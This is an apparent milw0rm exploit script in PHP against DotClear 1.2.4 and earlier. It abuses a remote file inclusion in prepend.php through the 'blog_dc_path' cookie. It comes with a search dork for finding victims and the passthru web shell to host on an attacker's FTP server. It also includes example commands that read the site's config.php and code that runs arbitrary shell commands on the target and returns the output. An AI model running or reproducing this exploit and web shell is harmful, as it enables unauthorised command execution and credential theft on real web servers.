#!/usr/bin/php -q -d short_open_tag=on
<?
echo "DotClear <= 1.2.4 prepend.php/'blog_dc_path' arbitrary remote inclusion\r\n";
echo "by rgod rgod@autistici.org\r\n";
echo "site: http://retrogod.altervista.org\r\n\r\n";
echo "dork: \"propulsé par DotClear\" \"fil atom\" \"fil rss\" +commentaires\r\n\r\n";

/*
works with PHP5
register_globals=On,
allow_url_fopen=On
*/

if ($argc<5) {
echo "Usage: php ".$argv[0]." host path ftp cmd OPTIONS\r\n";
echo "host:      target server (ip/hostname)\r\n";
echo "path:      path to dotclear\r\n";
echo "ftp:       a ftp location (without ending slash)\r\n";
echo "cmd:       a shell command\r\n";
echo "Options:\r\n";
echo "   -p[port]:    specify a port other than 80\r\n";
echo "   -P[ip:port]: specify a proxy\r\n";
echo "Examples:\r\n";
echo "php ".$argv[0]." target.com /dotclear/ ftp://username:pass@somehost.com cat ./../conf/config.php\r\n";
echo "php ".$argv[0]." target.com /dotclear/ ftp://username:pass@somehost.com/somedir ls -la -p81\r\n";
echo "php ".$argv[0]." target.com / ftp://username:pass@somehost.com ls -la -P1.1.1.1:80\r\n";
echo "note, on remote ftp you need this code in themes/default/prepend.php:\r\n";
echo "<?php\r\n";
echo "if (get_magic_quotes_gpc()){\$_REQUEST[\"cmd\"]=stripslashes(\$_REQUEST[\"cmd\"]);}\r\n";
echo "ini_set(\"max_execution_time\",0);\r\n";
echo "echo chr(0x2A).chr(0x64).chr(0x65).chr(0x6C).chr(0x69).chr(0x2A);\r\n";
echo "passthru(\$_REQUEST[\"cmd\"]);\r\n";
echo "echo chr(0x2A).chr(0x64).chr(0x65).chr(0x6C).chr(0x69).chr(0x2A);\r\n";
echo "?>\r\n";
die;
}
/*
  software site: http://www.dotclear.net/

  vulnerable code in layout/prepend.php near lines 78-104:

...
# Variable de conf
$theme_path = $blog_dc_path.'/themes/';
$theme_uri = dc_app_url.'/themes/';
$img_path = dc_img_url;

# Définition du thème et de la langue
$__theme = dc_theme;
$__lang = dc_default_lang;

# Ajout des functions.php des plugins
$objPlugins = new plugins(dirname(__FILE__).'/../'.DC_ECRIRE.'/tools/');
foreach ($objPlugins->getFunctions() as $pfunc) {
	require_once $pfunc;
}

# Définition du template
if (!is_dir($theme_path.$__theme)) {
	header('Content-type: text/plain');
	echo 'Le thème '.$__theme.' n\'existe pas';
	exit;
}

if (file_exists($theme_path.$__theme.'/template.php')) {
	$dc_template_file = $theme_path.$__theme.'/template.php';
} else {
	$dc_template_file = $theme_path.'default/template.php';
}
echo $dc_template_file;
# Prepend du template s'il existe
if (file_exists(dirname($dc_template_file).'/prepend.php')) {
	require dirname($dc_template_file).'/prepend.php';
}
...


$blog_dc_path var is not sanitized before to be used to include files,
on PHP5, because is_dir() and file_exists() funcs support ftp wrappers,
you can include an arbitrary prepend.php file in a themes/default/ folder
from a remote resource, poc:

http://[target]/[path_to_dotclear]/layout/prepend.php?blog_dc_path=ftp://username:password@somesite.com&cmd=ls%20-la

									      */
error_reporting(0);
ini_set("max_execution_time",0);
ini_set("default_socket_timeout",5);

function quick_dump($string)
{
  $result='';$exa='';$cont=0;
  for ($i=0; $i<=strlen($string)-1; $i++)
  {
   if ((ord($string[$i]) <= 32 ) | (ord($string[$i]) > 126 ))
   {$result.="  .";}
   else
   {$result.="  ".$string[$i];}
   if (strlen(dechex(ord($string[$i])))==2)
   {$exa.=" ".dechex(ord($string[$i]));}
   else
   {$exa.=" 0".dechex(ord($string[$i]));}
   $cont++;if ($cont==15) {$cont=0; $result.="\r\n"; $exa.="\r\n";}
  }
 return $exa."\r\n".$result;
}
$proxy_regex = '(\b\d{1,3}\.\d{1,3}\.\d{1,3}\.\d{1,3}\:\d{1,5}\b)';
function sendpacketii($packet)
{
  global $proxy, $host, $port, $html, $proxy_regex;
  if ($proxy=='') {
    $ock=fsockopen(gethostbyname($host),$port);
    if (!$ock) {
      echo 'No response from '.$host.':'.$port; die;
    }
  }
  else {
	$c = preg_match($proxy_regex,$proxy);
    if (!$c) {
      echo 'Not a valid proxy...';die;
    }
    $parts=explode(':',$proxy);
    echo "Connecting to ".$parts[0].":".$parts[1]." proxy...\r\n";
    $ock=fsockopen($parts[0],$parts[1]);
    if (!$ock) {
      echo 'No response from proxy...';die;
	}
  }
  fputs($ock,$packet);
  if ($proxy=='') {
    $html='';
    while (!feof($ock)) {
      $html.=fgets($ock);
    }
  }
  else {
    $html='';
    while ((!feof($ock)) or (!eregi(chr(0x0d).chr(0x0a).chr(0x0d).chr(0x0a),$html))) {
      $html.=fread($ock,1);
    }
  }
  fclose($ock);
  #debug
  #echo "\r\n".$html;
}

$host=$argv[1];
$path=$argv[2];
$loc=$argv[3];
$cmd="";$port=80;$proxy="";

for ($i=4; $i<=$argc-1; $i++){
$temp=$argv[$i][0].$argv[$i][1];
if (($temp<>"-p") and ($temp<>"-P"))
{$cmd.=" ".$argv[$i];}
if ($temp=="-p")
{
  $port=str_replace("-p","",$argv[$i]);
}
if ($temp=="-P")
{
  $proxy=str_replace("-P","",$argv[$i]);
}
}
$loc=urlencode($loc);
$cmd=urlencode($cmd);

if (($path[0]<>'/') or ($path[strlen($path)-1]<>'/')) {echo 'Error... check the path!'; die;}
if ($proxy=='') {$p=$path;} else {$p='http://'.$host.':'.$port.$path;}

$packet="GET ".$path."layout/prepend.php HTTP/1.0\r\n";
$packet.="User-Agent: Googlebot/2.1\r\n";
$packet.="Cookie: blog_dc_path=".$loc."; cmd=".$cmd.";\r\n"; //through cookies, log this
$packet.="Host: ".$host."\r\n";
$packet.="Connection: Close\r\n\r\n";
sendpacketii($packet);
if (strstr($html,"*deli*"))
{echo "exploit succeeded...\r\n";
 $temp=explode("*deli*",$html);
 die($temp[1]);
}
else
{echo "exploit failed...\r\n";
 //debug
 echo $html;
}
?>

# milw0rm.com [2006-06-03]
